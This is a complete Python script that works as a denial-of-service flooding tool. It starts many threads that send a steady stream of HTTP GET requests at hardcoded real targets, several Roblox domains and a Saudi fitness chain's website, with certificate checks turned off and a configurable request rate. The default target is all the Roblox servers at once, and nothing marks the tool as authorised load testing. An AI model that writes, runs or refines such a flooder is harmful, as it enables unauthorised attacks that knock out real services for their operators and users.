import os
import sys
import socket
import threading
import time
import random
from urllib.parse import urlparse

# قراءة الإعدادات تلقائياً من متغيرات البيئة أو استخدام القيم الافتراضية
TARGET_CHOICE = os.environ.get("TARGET_CHOICE", "5")  # 5 = All Roblox Servers Combined
BOTS_COUNT = int(os.environ.get("BOTS_COUNT", "50"))
RPS = int(os.environ.get("RPS", "100"))

targets = {
    "1": {"name": "Roblox Main", "url": "https://www.roblox.com"},
    "2": {"name": "Roblox API", "url": "https://api.roblox.com"},
    "3": {"name": "Roblox Client Settings", "url": "https://clientsettings.roblox.com"},
    "4": {"name": "Roblox Auth", "url": "https://auth.roblox.com"},
    "5": {"name": "All Roblox Servers Combined", "url": "ALL_ROBLOX"},
    "6": {"name": "Fitness Time", "url": "https://www.fitnesstime.com.sa"}
}

roblox_pool = [
    ("www.roblox.com", 443, "https"),
    ("api.roblox.com", 443, "https"),
    ("clientsettings.roblox.com", 443, "https"),
    ("auth.roblox.com", 443, "https")
]

paths_list = ["/", "/ar", "/clubs", "/offers", "/contact", "/about"]

is_running = True
success_count = 0
fail_count = 0
lock = threading.Lock()

def parse_target(url):
    if url == "ALL_ROBLOX":
        return "ALL_ROBLOX", 443, "https"
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url
    parsed = urlparse(url)
    host = parsed.hostname or "127.0.0.1"
    port = parsed.port
    if not port:
        port = 443 if parsed.scheme == "https" else 80
    return host, port, parsed.scheme

def worker_task(host, port, use_ssl, rate_limiter):
    global success_count, fail_count, is_running
    
    while is_running:
        rate_limiter.acquire()
        
        if host == "ALL_ROBLOX":
            target_host, target_port, target_scheme = random.choice(roblox_pool)
        else:
            target_host, target_port, target_scheme = host, port, use_ssl

        current_path = random.choice(paths_list)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            if target_scheme == "https":
                import ssl
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target_host)
            
            s.connect((target_host, target_port))
            payload = f"GET {current_path} HTTP/1.1\r\nHost: {target_host}\r\nConnection: close\r\n\r\n".encode('ascii')
            s.sendall(payload)
            s.close()

            with lock:
                success_count += 1
        except Exception:
            with lock:
                fail_count += 1

class RateLimiter:
    def __init__(self, rps):
        self.rps = rps
        self.interval = 1.0 / rps if rps > 0 else 0
        self.last_check = time.time()
        self.lock = threading.Lock()

    def acquire(self):
        if self.rps <= 0:
            return
        with self.lock:
            now = time.time()
            elapsed = now - self.last_check
            if elapsed < self.interval:
                time.sleep(self.interval - elapsed)
            self.last_check = time.time()

def main():
    global success_count, fail_count
    
    if TARGET_CHOICE in targets:
        target_url = targets[TARGET_CHOICE]["url"]
        target_name = targets[TARGET_CHOICE]["name"]
    else:
        target_url = "ALL_ROBLOX"
        target_name = "All Roblox Servers Combined"

    host, port, scheme = parse_target(target_url)
    success_count = 0
    fail_count = 0

    limiter = RateLimiter(RPS)

    print(f"[*] Cloud Bot Started Successfully!")
    print(f"[*] Target: {target_name}")
    print(f"[*] Bots (Threads): {BOTS_COUNT} | Target Rate: {RPS} RPS")

    thread_list = []
    for _ in range(BOTS_COUNT):
        t = threading.Thread(target=worker_task, args=(host, port, scheme, limiter))
        t.daemon = True
        thread_list.append(t)
        t.start()

    try:
        while is_running:
            with lock:
                sys.stdout.write(f"\r[+] Success: {success_count} | Failed: {fail_count}    ")
                sys.stdout.flush()
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Stopping...")

if __name__ == "__main__":
    main()
